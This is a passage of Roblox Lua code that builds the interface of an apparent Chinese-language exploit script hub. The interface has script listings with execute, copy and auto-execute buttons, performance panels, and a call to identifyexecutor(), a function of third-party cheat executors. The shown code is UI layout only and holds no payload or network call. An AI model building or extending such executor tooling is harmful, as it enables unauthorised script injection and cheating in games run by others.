Blur.Size = 100
game.Workspace.CurrentCamera.FieldOfView  = 30
else
if MusicButton.Image == "rbxassetid://15997129790" then
MusicButton.Image = "rbxassetid://15996975276"
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
CloseUISound:Play()
Blur.Size = 0
game.Workspace.CurrentCamera.FieldOfView  = 70
end
end
end)

MinButton.Name = "MinButton"
MinButton.Parent = UIGui
MinButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MinButton.Position = UDim2.new(0, 0, 0.43, 0)
MinButton.Size = UDim2.new(0, 30, 0, 30)
MinButton.AutoButtonColor = false
MinButton.Font = Enum.Font.SourceSansBold
MinButton.Text = "<"
MinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinButton.TextSize = 30
MinButton.BackgroundTransparency = 1
 
Clock.Parent = CoreSystemFrame
Clock.Size = UDim2.new(0, 55, 0, 32)
Clock.Position = UDim2.new(0, -2.5, 0, 195)
Clock.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Clock.BackgroundTransparency = 1
Clock.Text = os.date("%H:%M")
Clock.TextColor3 = Color3.fromRGB(200, 200, 200)
Clock.Font = Enum.Font.SourceSansBold
Clock.TextSize = 20
 
MinButton:TweenPosition(UDim2.new(0.05, 0, 0.43, 0),"InOut","Sine",1)
CoreSystemFrameBackground:TweenPosition(UDim2.new(0.03, 0, 0.45, 0),"InOut","Sine",1)
 
MinButton.MouseButton1Click:Connect(function()
UIClick:Play()
Blur.Size = 0
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
HomeButton.Image = "rbxassetid://15997029966"
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
MusicButton.Image = "rbxassetid://15996975276"
ConsoleButton.Image = "rbxassetid://16006754625"
EditorButton.Image = "rbxassetid://16006689419"
if MinButton.Text == "<" then
MinButton.Text = ">"
CoreSystemFrameBackground:TweenPosition(UDim2.new(-0.03, 0, 0.45, 0),"InOut","Sine",0.15)
MinButton:TweenPosition(UDim2.new(0, 0, 0.43, 0),"InOut","Sine",0.15)
else
if MinButton.Text == ">" then
MinButton.Text = "<"
MinButton:TweenPosition(UDim2.new(0.05, 0, 0.43, 0),"InOut","Sine",0.15)
CoreSystemFrameBackground.Visible = true
CoreSystemFrameBackground:TweenPosition(UDim2.new(0.03, 0, 0.45, 0),"InOut","Sine",0.15)
end
end
end)
 
PlayerIcon.Name = "PlayerIcon"
PlayerIcon.Parent = PlayerIconBackground
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlayerIcon.Position = UDim2.new(0.026, 0, 0.025, 0)
PlayerIcon.Size = UDim2.new(0, 66, 0, 66)
PlayerIcon.Image = "rbxassetid://15980315949"
 
PlayerIconUI.Parent = PlayerIcon
PlayerIconUI.CornerRadius = UDim.new(0.5, 0)
 
PlayerIconBackground.Name = "PlayerIconBackground"
PlayerIconBackground.Parent = GameFrame
PlayerIconBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
PlayerIconBackground.Position = UDim2.new(0.05, 0, -0.6, 0)
PlayerIconBackground.Size = UDim2.new(0, 70, 0, 70)
 
PlayerIconBackgroundUI.Parent = PlayerIconBackground
PlayerIconBackgroundUI.CornerRadius = UDim.new(0.5, 0)
 
WelcomeLabel.Name = "WelcomeLabel"
WelcomeLabel.Parent = GameFrame
WelcomeLabel.BackgroundTransparency = 1
WelcomeLabel.Position = UDim2.new(0.23, 0, -0.6, 0)
WelcomeLabel.Size = UDim2.new(0.5, 0, 0.4, 0)
WelcomeLabel.Font = Enum.Font.SourceSansBold
WelcomeLabel.Text = "欢迎回家，用户"
WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WelcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
WelcomeLabel.TextYAlignment = Enum.TextYAlignment.Top
WelcomeLabel.TextWrapped = true
WelcomeLabel.TextSize = 25
 
GameFrameBackground.Name = "GameFrameBackground"
GameFrameBackground.Parent = UIGui
GameFrameBackground.Position = UDim2.new(0.25, 0, -1, 0)
GameFrameBackground.Size = UDim2.new(0.5, 0, 0.5, 0)
GameFrameBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
 
GameFrameBackgroundUICorner.Parent = GameFrameBackground
GameFrameBackgroundUICorner.CornerRadius = UDim.new(0, 12)
 
GameFrame.Name = "GameFrame"
GameFrame.Parent = GameFrameBackground
GameFrame.Position = UDim2.new(0.005, 0, 0.01, 0)
GameFrame.Size = UDim2.new(0.99, 0, 0.985, 0)
GameFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GameFrame.Image = "rbxassetid://16027463995"
 
GameFrameUICorner.Parent = GameFrame
GameFrameUICorner.CornerRadius = UDim.new(0, 12)
 
FPSLabel.Name = "FPSLabel"
FPSLabel.Parent = GameFrame
FPSLabel.Position = UDim2.new(0.01, 0, 0.015, 0)
FPSLabel.Size = UDim2.new(0.35, 0, 0.2, 0)
FPSLabel.Font = Enum.Font.SourceSansBold
FPSLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FPSLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
FPSLabel.TextSize = 25
FPSLabel.BackgroundTransparency = 0.8
 
FPSLabelUICorner.Parent = FPSLabel
FPSLabelUICorner.CornerRadius = UDim.new(0, 12)
 
local function fre()
    local fr = tick()
    for index = #FPS, 1, -1 do
        FPS[index + 1] = (FPS[index] >= fr - 1) and FPS[index] or nil
    end
    FPS[1] = fr
    local fps = (tick() - sec >= 1 and #FPS) or (#FPS / (tick() - sec))
    fps = math.floor(fps)
    FPSLabel.Text = "帧率: "..fps
end
sec = tick()
RenderStepped:Connect(fre)
 
PingLabel.Name = "PingLabel"
PingLabel.Parent = GameFrame
PingLabel.Position = UDim2.new(0.37, 0, 0.015, 0)
PingLabel.Size = UDim2.new(0.62, 0, 0.2, 0)
PingLabel.Font = Enum.Font.SourceSansBold
PingLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PingLabel.TextSize = 25
PingLabel.BackgroundTransparency = 0.8
 
PingLabelUICorner.Parent = PingLabel
PingLabelUICorner.CornerRadius = UDim.new(0, 12)
 
 
CPULabel.Name = "CPULabel"
CPULabel.Parent = GameFrame
CPULabel.Position = UDim2.new(0.01, 0, 0.265, 0)
CPULabel.Size = UDim2.new(0.62, 0, 0.2, 0)
CPULabel.Font = Enum.Font.SourceSansBold
CPULabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CPULabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CPULabel.TextSize = 25
CPULabel.BackgroundTransparency = 0.8
 
CPUUICorner.Parent = CPULabel
CPUUICorner.CornerRadius = UDim.new(0, 12)
 
GPULabel.Name = "GPULabel"
GPULabel.Parent = GameFrame
GPULabel.Position = UDim2.new(0.64, 0, 0.265, 0)
GPULabel.Size = UDim2.new(0.35, 0, 0.2, 0)
GPULabel.Font = Enum.Font.SourceSansBold
GPULabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GPULabel.TextColor3 = Color3.fromRGB(255, 255, 255)
GPULabel.TextSize = 25
GPULabel.BackgroundTransparency = 0.8
 
GPUUICorner.Parent = GPULabel
GPUUICorner.CornerRadius = UDim.new(0, 12)
 
PlayersInServer.Name = "PlayersInServer"
PlayersInServer.Parent = GameFrame
PlayersInServer.Position = UDim2.new(0.01, 0, 0.78, 0)
PlayersInServer.Size = UDim2.new(0.62, 0, 0.2, 0)
PlayersInServer.Font = Enum.Font.SourceSansBold
PlayersInServer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayersInServer.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayersInServer.TextSize = 25
PlayersInServer.BackgroundTransparency = 0.8
 
PlayersInServerUICorner.Parent = PlayersInServer
PlayersInServerUICorner.CornerRadius = UDim.new(0, 12)
 
ServerSize.Name = "ServerSize"
ServerSize.Parent = GameFrame
ServerSize.Position = UDim2.new(0.64, 0, 0.78, 0)
ServerSize.Size = UDim2.new(0.35, 0, 0.2, 0)
ServerSize.Font = Enum.Font.SourceSansBold
ServerSize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerSize.TextColor3 = Color3.fromRGB(255, 255, 255)
ServerSize.TextSize = 25
ServerSize.BackgroundTransparency = 0.8
 
ServerSizeUICorner.Parent = ServerSize
ServerSizeUICorner.CornerRadius = UDim.new(0, 12)
 
 
ServerLive.Name = "ServerLive"
ServerLive.Parent = GameFrame
ServerLive.Position = UDim2.new(0.01, 0, 0.52, 0)
ServerLive.Size = UDim2.new(0.35, 0, 0.2, 0)
ServerLive.Font = Enum.Font.SourceSansBold
ServerLive.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerLive.TextColor3 = Color3.fromRGB(255, 255, 255)
ServerLive.TextSize = 25
ServerLive.BackgroundTransparency = 0.8
ServerLive.TextScaled = true
ServerLive.TextWrapped = true
 
ServerLiveUICorner.Parent = ServerLive
ServerLiveUICorner.CornerRadius = UDim.new(0, 12)
 
Executor.Name = "Executor"
Executor.Parent = GameFrame
Executor.Position = UDim2.new(0.37, 0, 0.52, 0)
Executor.Size = UDim2.new(0.62, 0, 0.2, 0)
Executor.Font = Enum.Font.SourceSansBold
Executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor.TextColor3 = Color3.fromRGB(255, 255, 255)
Executor.TextSize = 25
Executor.BackgroundTransparency = 0.8
 
ExecutorUICorner.Parent = Executor
ExecutorUICorner.CornerRadius = UDim.new(0, 12)
 
spawn(function()
repeat
wait()
local ping = tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue())
local gpu = tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").GPU:GetValue())
local cpu = tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").CPU:GetValue())
cpu = math.floor(cpu)
gpu = math.floor(gpu)
ping = math.floor(ping)
PingLabel.Text = "Ping: "..ping
CPULabel.Text = "CPU: "..cpu
GPULabel.Text = "GPU: "..gpu
PlayersInServer.Text = "玩家数: "..#game.Players:GetPlayers()
ServerSize.Text = "服务器容量: "..game.Players.MaxPlayers
ServerLive.Text = "服务器在线时间: "..convertToHMS(time())
Executor.Text = "执行器: "..identifyexecutor()
Clock.Text = os.date("%H:%M")
until 
PingLabel == nil
end)

InfoBox.Visible = false
 
InfoBox.Name = "InfoBox"
InfoBox.Parent = MainFrame
InfoBox.BackgroundTransparency = 0.2
InfoBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoBox.BorderSizePixel = 0
InfoBox.Position = UDim2.new(-3.55, 0, -1.4, 0)
InfoBox.Size = UDim2.new(0, 855, 0, 400)
InfoBox.ZIndex = 3
 
InfoBoxUICorner.CornerRadius = UDim.new(0, 12)
InfoBoxUICorner.Parent = InfoBox

SearchBox.Name = "SearchBox"
SearchBox.Parent = MainFrame
SearchBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearchBox.BackgroundTransparency = 0.5
SearchBox.Position = UDim2.new(-3.55, 0, -1.8, 0)
SearchBox.Size = UDim2.new(0, 855, 0, 26)
SearchBox.ClearTextOnFocus = false
SearchBox.Font = Enum.Font.SourceSansBold
SearchBox.PlaceholderText = "点击搜索"
SearchBox.Text = ""
SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBox.TextTransparency = 0
SearchBox.TextScaled = true
SearchBox.TextSize = 14.000
SearchBox.TextWrapped = true
 
UICorner_3.CornerRadius = UDim.new(0, 12)
UICorner_3.Parent = SearchBox
 
ScriptListFrame.Name = "ScriptListFrame"
ScriptListFrame.Parent = MainFrame
ScriptListFrame.Active = true
ScriptListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptListFrame.BackgroundTransparency = 1
ScriptListFrame.BorderSizePixel = 0
ScriptListFrame.Position = UDim2.new(-3.8, 0, -1.5, 0)
ScriptListFrame.Size = UDim2.new(0, 1000, 0, 420)
ScriptListFrame.ZIndex = 2
ScriptListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
 
ScriptAuthor.Name = "ScriptAuthor"
ScriptAuthor.Parent = ScriptFrame
ScriptAuthor.BackgroundTransparency = 1
ScriptAuthor.Position = UDim2.new(0, 10, 0, 150)
ScriptAuthor.Size = UDim2.new(0, 280, 0, 30)
ScriptAuthor.Font = Enum.Font.SourceSansBold
ScriptAuthor.Text = "作者：ScriptAuthor"
ScriptAuthor.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptAuthor.TextSize = 14.000
ScriptAuthor.TextWrapped = true
ScriptAuthor.TextScaled = true
ScriptAuthor.TextXAlignment = Enum.TextXAlignment.Left
 
UIPadding.Parent = ScriptListFrame
UIPadding.PaddingBottom = UDim.new(0, 10)
UIPadding.PaddingLeft = UDim.new(0, 25)
UIPadding.PaddingRight = UDim.new(0, 25)
UIPadding.PaddingTop = UDim.new(0, 10)
 
Scripts.Name = "Scripts"
Scripts.Parent = ScriptListFrame
 
UIGridLayout.Parent = Scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 20, 0, 20)
UIGridLayout.CellSize = UDim2.new(0, 855, 0, 400)
 
ScriptFrame.Name = "ScriptFrame"
ScriptFrame.Parent = Scripts
ScriptFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptFrame.BackgroundTransparency = 0.5
ScriptFrame.Size = UDim2.new(0, 200, 0, 100)
ScriptFrame.Position = UDim2.new(1.5, 0, 0, 0)
ScriptFrame.Image = "rbxassetid://16050153732"
 
UICorner_6.CornerRadius = UDim.new(0, 12)
UICorner_6.Parent = ScriptFrame
 
ScriptTitle.Name = "ScriptTitle"
ScriptTitle.Parent = ScriptFrame
ScriptTitle.BackgroundTransparency = 1
ScriptTitle.Position = UDim2.new(0, 10, 0, 20)
ScriptTitle.Size = UDim2.new(0, 840, 0, 100)
ScriptTitle.Font = Enum.Font.SourceSansBold
ScriptTitle.Text = "脚本标题"
ScriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle.TextScaled = true
ScriptTitle.TextSize = 14.000
ScriptTitle.TextWrapped = true
ScriptTitle.TextXAlignment = Enum.TextXAlignment.Left
 
ExecuteButtonBackground.Name = "ExecuteButtonBackground"
ExecuteButtonBackground.Parent = ScriptFrame
ExecuteButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ExecuteButtonBackground.Position = UDim2.new(0.0123, 0, 0.794, 0)
ExecuteButtonBackground.Size = UDim2.new(0, 205, 0, 55)
 
ExecuteButtonBackgroundUICorner.Parent = ExecuteButtonBackground
ExecuteButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Parent = ScriptFrame
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton.Position = UDim2.new(0.015, 0, 0.8, 0)
ExecuteButton.Size = UDim2.new(0, 200, 0, 50)
ExecuteButton.AutoButtonColor = false
ExecuteButton.Font = Enum.Font.SourceSansBold
ExecuteButton.Text = "执行"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.TextSize = 14.000
ExecuteButton.TextScaled = true
ExecuteButton.TextWrapped = true
 
UICorner_7.CornerRadius = UDim.new(0, 12)
UICorner_7.Parent = ExecuteButton
 
CopyLinkButtonBackground.Name = "CopyLinkButtonBackground"
CopyLinkButtonBackground.Parent = ScriptFrame
CopyLinkButtonBackground.BackgroundColor3 = Color3.fromRGB(55,55, 55)
CopyLinkButtonBackground.Position = UDim2.new(0.2569, 0, 0.794, 0)
CopyLinkButtonBackground.Size = UDim2.new(0, 205, 0, 55)
 
CopyLinkButtonBackgroundUICorner.Parent = CopyLinkButtonBackground
CopyLinkButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
CopyLinkButton.Name = "CopyLinkButton"
CopyLinkButton.Parent = ScriptFrame
CopyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyLinkButton.Position = UDim2.new(0.26, 0, 0.8, 0)
CopyLinkButton.Size = UDim2.new(0, 200, 0, 50)
CopyLinkButton.AutoButtonColor = false
CopyLinkButton.Font = Enum.Font.SourceSansBold
CopyLinkButton.Text = "复制链接"
CopyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkButton.TextSize = 14.000
CopyLinkButton.TextScaled = true
CopyLinkButton.TextWrapped = true
 
CopyLinkButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyLinkButtonUICorner.Parent = CopyLinkButton

CopyScriptBackground.Name = "CopyScriptBackground"
CopyScriptBackground.Parent = ScriptFrame
CopyScriptBackground.BackgroundColor3 = Color3.fromRGB(55 ,55, 55)
CopyScriptBackground.Position = UDim2.new(0.5022, 0, 0.794, 0)
CopyScriptBackground.Size = UDim2.new(0, 205, 0, 55)
 
CopyScriptBackgroundUICorner.Parent = CopyScriptBackground
CopyScriptBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
CopyScriptButton.Name = "CopyScriptButton"
CopyScriptButton.Parent = ScriptFrame
CopyScriptButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyScriptButton.Position = UDim2.new(0.505, 0, 0.8, 0)
CopyScriptButton.Size = UDim2.new(0, 200, 0, 50)
CopyScriptButton.AutoButtonColor = false
CopyScriptButton.Font = Enum.Font.SourceSansBold
CopyScriptButton.Text = "复制脚本"
CopyScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyScriptButton.TextSize = 14.000
CopyScriptButton.TextScaled = true
CopyScriptButton.TextWrapped = true
 
CopyScriptButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyScriptButtonUICorner.Parent = CopyScriptButton
 
OpenDescriptionBackground.Name = "OpenDescriptionBackground"
OpenDescriptionBackground.Parent = ScriptFrame
OpenDescriptionBackground.BackgroundColor3 = Color3.fromRGB(55,55, 55)
OpenDescriptionBackground.Position = UDim2.new(0.747, 0, 0.794, 0)
OpenDescriptionBackground.Size = UDim2.new(0, 205, 0, 55)
 
OpenDescriptionBackgroundUICorner.Parent = OpenDescriptionBackground
OpenDescriptionBackgroundUICorner.CornerRadius = UDim.new(0, 15)

OpenDescriptionButton.Name = "OpenDescriptionButton"
OpenDescriptionButton.Parent = ScriptFrame
OpenDescriptionButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenDescriptionButton.Position = UDim2.new(0.75, 0, 0.8, 0)
OpenDescriptionButton.Size = UDim2.new(0, 200, 0, 50)
OpenDescriptionButton.AutoButtonColor = false
OpenDescriptionButton.Font = Enum.Font.SourceSansBold
OpenDescriptionButton.Text = "描述"
OpenDescriptionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenDescriptionButton.TextSize = 14.000
OpenDescriptionButton.TextScaled = true
OpenDescriptionButton.TextWrapped = true
 
OpenDescriptionButtonUICorner.CornerRadius = UDim.new(0, 12)
OpenDescriptionButtonUICorner.Parent = OpenDescriptionButton
 
ScriptGame.Name = "ScriptGame"
ScriptGame.Parent = ScriptFrame
ScriptGame.BackgroundTransparency = 1
ScriptGame.Position = UDim2.new(0, 10, 0, 220)
ScriptGame.Size = UDim2.new(0, 280, 0, 30)
ScriptGame.Font = Enum.Font.SourceSansBold
ScriptGame.Text = "游戏"
ScriptGame.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptGame.TextSize = 14
ScriptGame.TextWrapped = true
ScriptGame.TextScaled = true
ScriptGame.TextXAlignment = Enum.TextXAlignment.Left
 
VerifiedScriptFrame.Name = "VerifiedScriptFrame"
VerifiedScriptFrame.Parent = Scripts
VerifiedScriptFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VerifiedScriptFrame.Size = UDim2.new(0, 300, 0, 150)
VerifiedScriptFrame.Image = "rbxassetid://16050153732"
 
UICorner_9.CornerRadius = UDim.new(0, 12)
UICorner_9.Parent = VerifiedScriptFrame
 
ScriptTitle_2.Name = "ScriptTitle"
ScriptTitle_2.Parent = VerifiedScriptFrame
ScriptTitle_2.BackgroundTransparency = 1
ScriptTitle_2.Position = UDim2.new(0, 10, 0, 20)
ScriptTitle_2.Size = UDim2.new(0, 840, 0, 100)
ScriptTitle_2.Font = Enum.Font.SourceSansBold
ScriptTitle_2.Text = "脚本标题"
ScriptTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle_2.TextScaled = true
ScriptTitle_2.TextSize = 14.000
ScriptTitle_2.TextWrapped = true
ScriptTitle_2.TextXAlignment = Enum.TextXAlignment.Left
 
VerifiedIcon.Name = "VerifiedIcon"
VerifiedIcon.Parent = VerifiedScriptFrame
VerifiedIcon.BackgroundTransparency = 0
VerifiedIcon.Position = UDim2.new(0.75, 0, 0.35, 0)
VerifiedIcon.Size = UDim2.new(0, 215, 0, 150)
VerifiedIcon.Image = "rbxassetid://15621211889"
VerifiedIcon.BackgroundTransparency = 1
 
ExecuteButtonBackground_2.Name = "ExecuteButtonBackground"
ExecuteButtonBackground_2.Parent = VerifiedScriptFrame
ExecuteButtonBackground_2.BackgroundColor3 = Color3.fromRGB(55,55, 55)
ExecuteButtonBackground_2.Position = UDim2.new(0.0123, 0, 0.794, 0)
ExecuteButtonBackground_2.Size = UDim2.new(0, 205, 0, 55)
 
ExecuteButtonBackgroundUICorner_2.Parent = ExecuteButtonBackground_2
ExecuteButtonBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)
 
ExecuteButton_2.Name = "ExecuteButton"
ExecuteButton_2.Parent = VerifiedScriptFrame
ExecuteButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton_2.Position = UDim2.new(0.015, 0, 0.8, 0)
ExecuteButton_2.Size = UDim2.new(0, 200, 0, 50)
ExecuteButton_2.AutoButtonColor = false
ExecuteButton_2.Font = Enum.Font.SourceSansBold
ExecuteButton_2.Text = "执行"
ExecuteButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton_2.TextSize = 14.000
ExecuteButton_2.TextScaled = true
ExecuteButton_2.TextWrapped = true
 
UICorner_10.CornerRadius = UDim.new(0, 12)
UICorner_10.Parent = ExecuteButton_2
 
CopyLinkButtonBackground_2.Name = "CopyLinkButtonBackground"
CopyLinkButtonBackground_2.Parent = VerifiedScriptFrame
CopyLinkButtonBackground_2.BackgroundColor3 = Color3.fromRGB(55,55, 55)
CopyLinkButtonBackground_2.Position = UDim2.new(0.2569, 0, 0.794, 0)
CopyLinkButtonBackground_2.Size = UDim2.new(0, 205, 0, 55)
 
CopyLinkButtonBackgroundUICorner_2.Parent = CopyLinkButtonBackground_2
CopyLinkButtonBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)
 
CopyLinkButton_2.Name = "CopyLinkButton"
CopyLinkButton_2.Parent = VerifiedScriptFrame
CopyLinkButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyLinkButton_2.Position = UDim2.new(0.26, 0, 0.8, 0)
CopyLinkButton_2.Size = UDim2.new(0, 200, 0, 50)
CopyLinkButton_2.AutoButtonColor = false
CopyLinkButton_2.Font = Enum.Font.SourceSansBold
CopyLinkButton_2.Text = "复制链接"
CopyLinkButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkButton_2.TextSize = 14.000
CopyLinkButton_2.TextScaled = true
CopyLinkButton_2.TextWrapped = true
 
CopyLinkButtonUICorner_2.CornerRadius = UDim.new(0, 12)
CopyLinkButtonUICorner_2.Parent = CopyLinkButton_2
 
AutoExecuteBackground.Name = "AutoExecuteBackground"
AutoExecuteBackground.Parent = ScriptFrame
AutoExecuteBackground.AnchorPoint = Vector2.new(0.5, 0.5)
AutoExecuteBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
AutoExecuteBackground.Position = UDim2.new(0.04, 0, 0.72, 0)
AutoExecuteBackground.Size = UDim2.new(0, 46, 0, 46)
 
AutoExecuteBackgroundUICorner.CornerRadius = UDim.new(0, 15)
AutoExecuteBackgroundUICorner.Parent = AutoExecuteBackground
 
AutoExecute.Name = "AutoExecute"
AutoExecute.Parent = ScriptFrame
AutoExecute.AnchorPoint = Vector2.new(0.5, 0.5)
AutoExecute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AutoExecute.Position = AutoExecuteBackground.Position
AutoExecute.Size = UDim2.new(0, 41, 0, 41)
AutoExecute.Text = "★"
AutoExecute.AutoButtonColor = false
AutoExecute.Font = Enum.Font.SourceSansBold
AutoExecute.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoExecute.TextSize = 35

AutoExecuteUICorner.CornerRadius = UDim.new(0, 12)
AutoExecuteUICorner.Parent = AutoExecute
 
CommentsBackground.Name = "CommentsBackground"
CommentsBackground.Parent = ScriptFrame
CommentsBackground.AnchorPoint = Vector2.new(0.5, 0.5)
CommentsBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
CommentsBackground.Position = UDim2.new(0.96, 0, 0.72, 0)
CommentsBackground.Size = UDim2.new(0, 46, 0, 46)
 
CommentsBackgroundUICorner.CornerRadius = UDim.new(0, 15)
CommentsBackgroundUICorner.Parent = CommentsBackground
 
CommentsButton.Name = "CommentsButton"
CommentsButton.Parent = ScriptFrame
CommentsButton.AnchorPoint = Vector2.new(0.5, 0.5)
CommentsButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CommentsButton.Position = CommentsBackground.Position
CommentsButton.Size = UDim2.new(0, 41, 0, 41)
CommentsButton.Image = "rbxassetid://18946598838"
CommentsButton.AutoButtonColor = false

CommentsButtonUICorner.CornerRadius = UDim.new(0, 12)
CommentsButtonUICorner.Parent = CommentsButton

CommentsBackground_2.Name = "CommentsBackground"
CommentsBackground_2.Parent = VerifiedScriptFrame
CommentsBackground_2.AnchorPoint = Vector2.new(0.5, 0.5)
CommentsBackground_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
CommentsBackground_2.Position = UDim2.new(0.96, 0, 0.72, 0)
CommentsBackground_2.Size = UDim2.new(0, 46, 0, 46)
 
CommentsBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)
CommentsBackgroundUICorner_2.Parent = CommentsBackground_2
 
CommentsButton_2.Name = "CommentsButton"
CommentsButton_2.Parent = VerifiedScriptFrame
CommentsButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
CommentsButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CommentsButton_2.Position = CommentsBackground_2.Position
CommentsButton_2.Size = UDim2.new(0, 41, 0, 41)
CommentsButton_2.Image = "rbxassetid://18946598838"
CommentsButton_2.AutoButtonColor = false

CommentsButtonUICorner_2.CornerRadius = UDim.new(0, 12)
CommentsButtonUICorner_2.Parent = CommentsButton_2

AutoExecuteBackground_2.Name = "AutoExecuteBackground"
AutoExecuteBackground_2.Parent = VerifiedScriptFrame
AutoExecuteBackground_2.AnchorPoint = Vector2.new(0.5, 0.5)
AutoExecuteBackground_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
AutoExecuteBackground_2.Position = AutoExecuteBackground.Position
AutoExecuteBackground_2.Size = UDim2.new(0, 46, 0, 46)
 
AutoExecuteBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)
AutoExecuteBackgroundUICorner_2.Parent = AutoExecuteBackground_2
 
AutoExecute_2.Name = "AutoExecute"
AutoExecute_2.Parent = VerifiedScriptFrame
AutoExecute_2.AnchorPoint = Vector2.new(0.5, 0.5)
AutoExecute_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AutoExecute_2.Position = AutoExecuteBackground.Position
AutoExecute_2.Size = UDim2.new(0, 41, 0, 41)
AutoExecute_2.Text = "★"
AutoExecute_2.AutoButtonColor = false
AutoExecute_2.Font = Enum.Font.SourceSansBold
AutoExecute_2.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoExecute_2.TextSize = 35

AutoExecuteUICorner_2.CornerRadius = UDim.new(0, 12)
AutoExecuteUICorner_2.Parent = AutoExecute_2

CopyScriptBackground_2.Name = "CopyScriptBackground"
CopyScriptBackground_2.Parent = VerifiedScriptFrame
CopyScriptBackground_2.BackgroundColor3 = Color3.fromRGB(55,55, 55)
CopyScriptBackground_2.Position = UDim2.new(0.5022, 0, 0.794, 0)
CopyScriptBackground_2.Size = UDim2.new(0, 205, 0, 55)
 
CopyScriptBackgroundUICorner_2.Parent = CopyScriptBackground_2
CopyScriptBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)
 
CopyScriptButton_2.Name = "CopyScriptButton"
CopyScriptButton_2.Parent = VerifiedScriptFrame
CopyScriptButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyScriptButton_2.Position = UDim2.new(0.505, 0, 0.8, 0)
CopyScriptButton_2.Size = UDim2.new(0, 200, 0, 50)
CopyScriptButton_2.AutoButtonColor = false
CopyScriptButton_2.Font = Enum.Font.SourceSansBold
CopyScriptButton_2.Text = "复制脚本"
CopyScriptButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyScriptButton_2.TextSize = 14.000
CopyScriptButton_2.TextScaled = true
CopyScriptButton_2.TextWrapped = true
 
